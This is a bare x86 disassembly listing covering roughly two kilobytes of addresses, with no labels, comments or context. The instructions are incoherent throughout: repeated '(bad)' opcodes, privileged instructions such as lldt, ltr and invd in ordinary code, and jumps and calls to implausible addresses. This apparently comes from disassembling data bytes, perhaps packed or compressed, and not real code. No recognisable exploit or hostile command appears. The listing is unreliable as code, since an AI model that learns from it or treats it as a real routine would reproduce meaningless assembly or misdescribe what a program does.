  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
